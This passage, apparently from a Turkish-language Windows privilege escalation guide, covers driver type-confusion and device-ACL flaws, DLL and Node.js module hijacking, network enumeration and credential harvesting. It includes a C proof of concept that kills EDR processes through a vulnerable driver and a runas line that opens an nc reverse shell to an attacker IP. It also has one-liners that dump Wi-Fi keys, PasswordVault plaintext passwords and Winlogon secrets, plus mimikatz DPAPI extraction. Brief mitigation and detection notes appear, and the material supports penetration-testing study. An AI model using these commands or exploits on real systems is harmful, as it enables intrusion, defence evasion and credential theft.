ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Corrupted I/O ring üzerinden keyfi kernel read/write elde ettikten sonra, standart post-primitive iş akışını kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitive’leri

Modern hive zafiyetleri, deterministik bellek düzenleri oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve özel bir driver olmadan metadata bozulmasını kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Tüm zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırganın denetimindeki path’lerden kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver’lar userland’den bir registry path’i kabul eder, yalnızca geçerli bir UTF-16 string olduğunu doğrular ve ardından `RTL_QUERY_REGISTRY_DIRECT` ile `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar’ına yapar. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse `EntryContext`, geliştiricinin beklediği türe göre değil, **gerçek** registry türüne göre yorumlanır.

Bu, kullanılabilecek iki primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcının denetimindeki mutlak bir `\Registry\...` path’i, driver’ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar üzerinden anahtarların varlığını sızdırmasına ve bazen çağıranın doğrudan erişemediği değerleri okumasına olanak tanır.
- **Kernel bellek bozulması**: `&readValue` gibi bir scalar hedef, registry value türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer şeklinde type confusion’a uğrar.

Pratik exploitation notları:

- **Windows 8+ azaltımı**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanarak **untrusted hive**’a erişirse kernel çağıranlar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploit edilebilirliği korumak için değerleri `HKCU` altında hazırlamak yerine **trusted system hive’lar içindeki saldırganın yazabildiği anahtarları** arayın.
- **Trusted-hive hazırlığı**: `\Registry\Machine` altındaki yazılabilir alt anahtarları sıralamak için NtObjectManager kullanın ve sandbox’lı bağlamlardan erişilebilen anahtarları bulmak için taramayı kopyalanmış bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4 baytlık bir `int` içine yapılan 8 baytlık doğrudan yazma, bitişik yığın verilerini bozar ve yakındaki bir callback/function pointer'ın üzerine kısmen yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: doğrudan mod, `EntryContext`'in bir `UNICODE_STRING`'e işaret etmesini bekler. Kod önce saldırgan denetimindeki bir `REG_DWORD` değerini yığın skalerine yükler ve ardından aynı arabelleği bir string okuması için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini denetler ve `Buffer` pointer'ını kısmen etkiler; bu da kısmen denetlenebilir bir kernel yazması sağlar.
- **`REG_BINARY`**: büyük ikili veriler için doğrudan mod, `EntryContext`'teki ilk `LONG` değerini işaretli arabellek boyutu olarak ele alır. Önceki bir `REG_DWORD` okuması yeniden kullanılan skalere saldırgan denetimindeki **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu saldırgan baytlarını doğrudan bitişik yığın yuvalarına kopyalar. Bu, çoğu zaman callback pointer'ının üzerine tamamen yazmak için en temiz yoldur.

Güçlü bir avlama örüntüsü: **yeniden başlatmadan aynı yığın değişkenine farklı türlerde registry okuması yapılması**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry okumasının ikinci okumanın yapılıp yapılmayacağını belirlediği kod yolları için grep yapın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğinden yararlanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar, IoCreateDeviceSecure aracılığıyla güçlü bir SDDL ile device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadan, device ek bir bileşen içeren bir path üzerinden açıldığında güvenli DACL uygulanmaz; böylece ayrıcalıksız herhangi bir kullanıcı aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadaki bir vakadan)

Kullanıcı device'ı açabildiğinde driver'ın sunduğu ayrıcalıklı IOCTL'ler LPE ve kurcalama için kötüye kullanılabilir. Gerçek ortamlarda gözlemlenen örnek yetenekler:
- İstenilen process'lere tam erişimli handle'lar döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Kısıtlamasız raw disk read/write (çevrimdışı kurcalama, boot-time persistence numaraları).
- Protected Process/Light (PP/PPL) dahil olmak üzere istenilen process'leri sonlandırma; bu, AV/EDR'nin user land üzerinden kernel aracılığıyla kapatılmasına olanak tanır.

Minimal PoC örüntüsü (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltma önlemleri
- DACL ile kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlemin sonlandırılmasına veya handle döndürülmesine izin vermeden önce PP/PPL denetimleri ekleyin.
- IOCTL'leri kısıtlayın (erişim maskeleri, METHOD_*, girdi doğrulaması) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli device adlarının (ör. \\ .\\amsdk*) user-mode tarafından açılmasını ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft'un güvenlik açığı bulunan driver blocklist'ini (HVCI/WDAC/Smart App Control) zorunlu kılın ve kendi izin/verme listelerinizi yönetin.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir klasörde yazma izinleriniz** varsa, bir process tarafından yüklenen DLL'i ele geçirip **ayrıcalıklarınızı yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron module resolution hijacking

Bu, `require("foo")` gibi yalın bir import yaptıklarında ve beklenen module **bulunamadığında** **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows denetimsiz arama yolu** çeşididir.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücünün kök dizinine kadar ulaşabilir. Bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu yolları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, buraya kötü amaçlı bir `foo.js` (veya package klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron sürecinin** bulunamayan dependency'yi çözümlemesini bekleyebilir. Payload, kurban sürecinin güvenlik bağlamında çalışır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir scheduled task/service wrapper üzerinden veya otomatik başlayan ayrıcalıklı bir masaüstü uygulaması olarak çalışıyorsa bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu senaryolarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- üçüncü taraf bir library, `require("foo")` çağrısını `try/catch` içine alıp başarısızlık durumunda çalışmaya devam ettiğinde
- bir package production build'lerinden çıkarıldığında, packaging sırasında dahil edilmediğinde veya kurulumu başarısız olduğunda
- güvenlik açığı bulunan `require()` çağrısı ana uygulama kodunda değil, dependency ağacının derinliklerinde bulunduğunda

### Güvenlik açığı bulunan hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` filtresini hedef executable'a (`node.exe`, Electron uygulamasının EXE'si veya wrapper süreci) göre ayarlayın
- `Path` filtresini `node_modules` içerecek şekilde ayarlayın
- `NAME NOT FOUND` olaylarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Unpacked `.asar` dosyalarında veya uygulama kaynaklarında işe yarayan code review kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak kod incelemesiyle **eksik paket adını** belirleyin.
2. Henüz yoksa kök arama dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Tam olarak beklenen adı taşıyan bir modül bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül yoksa Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, gerçek dünyada karşılaşılan eksik isteğe bağlı modüller arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan **teknik** kısmıdır: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleneceği herhangi bir **eksik bare import** bulun.

### Tespit ve güçlendirme fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- Yüksek bütünlük düzeyindeki süreçlerin `C:\node_modules\*` konumundan okuma yapıp yapmadığını araştırın.
- Üretimde tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda sessiz `try { require("...") } catch {}` örüntülerini gözden geçirin.
- Kütüphane destekliyorsa isteğe bağlı sondaları devre dışı bırakın (örneğin, bazı `ws` dağıtımlarında eski `utf-8-validate` sondasından `WS_NO_UTF_8_VALIDATE=1` ile kaçınılabilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlı hizmetleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir dinleyici için PID'yi işlemin sahibi, çalıştırılabilir dosyanın yolu ve işlemi başlatan hizmet veya zamanlanmış görevle ilişkilendirin. Bir uzaktan kontrol hizmeti, yalnızca kimlik doğrulaması ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklı bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: dinleyici ve ikili dosyanın yolu pasif ipuçlarıdır; kimliği doğrulanmış bir bellek bozulması yolu ise tam olarak o ikili dosyanın ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir port bir sistem işlemine ait gibi görünüyorsa, arka uç hizmetini ilişkilendirmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) komutunun sonucuyla karşılaştırın; tek başına bir yönlendirme kuralı, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya göz atın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

Ağ numaralandırması için daha fazla[ komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

`bash.exe` binary'si `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root kullanıcısı olursanız herhangi bir portu dinleyebilirsiniz (`nc.exe` ile ilk kez bir portu dinlemeye çalıştığınızda, GUI üzerinden `nc`'nin güvenlik duvarı tarafından engellenmesine izin verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` hesabı tek başına Windows Administrator yetkileri sağlamaz. Geçerli Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için shell-history dosyalarını ( `/root/.bash_history` dahil) inceleyin; yükseltme için yine de daha yüksek yetkili geçerli bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2 genellikle dağıtımı [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) depolar. Bu nedenle önce gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik numaralandırma sırasında geçmiş içeriğini yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgileri değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde düz metin olarak bulunan bir bulgudur. `AutoAdminLogon=1` olsa bile okunabilir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı bir LSA secret olarak depolayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve kayıt defterinin olağan yöntemlerle okunması, bu secret'ın var olup olmadığını veya alınıp alınamayacağını kanıtlamaz. Bir kimlik bilgisinin açığa çıktığını bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Kimlik Bilgileri Yöneticisi / Windows kasası

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault; sunucular, web siteleri ve **Windows**'un **kullanıcıları otomatik olarak oturum açtırmak** için kullanabileceği diğer programlara yönelik kullanıcı kimlik bilgilerini depolar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi siteler için kimlik bilgilerini depolayabileceği ve tarayıcıların otomatik olarak oturum açabileceği anlamına geliyor gibi gelebilir; ancak çalışma şekli bu değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırmak için kullanabileceği kimlik bilgilerini depolar. Bu da bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının** bu **Credential Manager** ve Windows Vault'tan yararlanabileceği ve kullanıcıların her seferinde kullanıcı adı ile parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynak için kimlik bilgilerini kullanmalarının mümkün olduğunu sanmıyorum. Dolayısıyla uygulamanız kasadan yararlanmak istiyorsa, varsayılan depolama kasasından ilgili kaynağın kimlik bilgilerini almak için bir şekilde **Credential Manager ile iletişim kurmalı ve bu kimlik bilgilerini istemelidir**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Daha sonra kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir ikili dosyayı çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla da kullanılabileceğini unutmayın.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve düz metin parolaları, Universal Windows Platform (UWP) `PasswordVault` içinde saklar (`vaultcmd` aracında `Web Credentials` olarak da görünür). Bu depolama alanı oturum yalıtımlıdır ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak şifresi çözülebilir.

Saklanan tüm kullanıcı adlarını ve düz metin parolaları anında dump edip şifrelerini çözmek için bu PowerShell komutunu kullanıcının etkin oturumunda çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve Windows işletim sisteminde çoğunlukla asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiyi önemli ölçüde artırmak için kullanıcıya veya sisteme ait bir gizli bilgiden yararlanır.

**DPAPI, kullanıcının oturum açma gizli bilgilerinden türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin etki alanı kimlik doğrulama gizli bilgilerini kullanır.

DPAPI ile şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Kullanıcının özel anahtarlarını koruyan ana anahtarla aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell aracılığıyla listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Şifresini çözmek için uygun argümanlarla (`/pvk` veya `/rpc`) **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**Ana parolayla korunan kimlik bilgisi dosyaları** genellikle şu konumda bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` modülünü uygun `/masterkey` ile kullanarak şifreyi çözebilirsiniz.\
(root yetkiniz varsa) `sekurlsa::dpapi` modülüyle **memory**'den çok sayıda DPAPI **masterkey**'i **extract** edebilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**, şifrelenmiş kimlik bilgilerini kullanışlı bir şekilde saklamak için **scripting** ve otomasyon görevlerinde sıkça kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılmış bir kimlik bilgisi herhangi bir dosya adına veya `.xml` yoluna sahip olabilir. Bir script ya da dosya envanteri bunlardan birini gösteriyorsa, `C:\Users` varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan herhangi bir hesabın hedef hizmette ayrıca geçerli yetkilere sahip olması gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya açık metin değerlerini yazdırmadan önce yolları ve ACL'leri inceleyin.

Bir dosyada bulunan PS credentials'ın şifresini çözmek için şunu yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak **tüm .rdg dosyalarının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **birçok DPAPI masterkey'i çıkarabilirsiniz**

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` altındaki ve kullanıcı Belgeler klasöründeki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar dahil, inceleyin. Bir XML dosyasını kimlik bilgisi ipucu olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir ana parola kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı aramalarda şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** kullanıcı dizinlerinde veya paylaşılan yönetim klasörlerinde okunabilir durumda olabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir parola öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, kimlik bilgisi ipucu olarak değerlendirin: [üreticinin belirttiğine göre](https://www.donkz.nl/) profil koruması, oluşturan hesaba ve bilgisayara bağlanabilir veya daha esnek şekilde yapılandırılabilir. Bu dosyaya güvenmeden önce kaynağını ve kurtarma koşullarını doğrulayın.

### Yapışkan Notlar

Kullanıcılar, bunun bir veritabanı dosyası olduğunun farkında olmadan Windows iş istasyonlarındaki StickyNotes uygulamasını **parolaları** ve diğer bilgileri **kaydetmek** için sıkça kullanır. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve aranıp incelenmeye her zaman değer.

Kullanıcılar bazen yapışkan not uygulamalarına parolaları ve diğer bilgileri kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması notları genellikle `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; daha eski veya farklı uygulamalar, LevelDB dahil, kullanıcı profillerinde başka depolama alanları kullanabilir. Eksik bir SQLite dosyasını notların bulunmadığının kanıtı saymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes, SQLite yazma-öncesi günlükleme kullanıyorsa yalnızca `plum.sqlite` dosyasının kopyası yakın zamanda kaydedilmiş notları içermeyebilir. Veritabanının tutarlı bir kopyasını alırken ilgili `plum.sqlite-wal` dosyasını da saklayın ve varsa `plum.sqlite-shm` dosyasını da ekleyin; paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. Bkz. [SQLite'ın WAL belgeleri](https://www.sqlite.org/wal.html). Hesap adı veya parola içeren bir not yalnızca bir kimlik bilgisi ipucudur: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrıca doğrulayın. Şifrelenmiş bir parola yöneticisi kaydı, daha yüksek ayrıcalıklı bir oturum açmayı kanıtlayabilmek için ayrıca gerçek şifre çözme anahtarını ve uygulamaya özgü yorumlamayı gerektirir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalışmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya varsa bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'tan alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
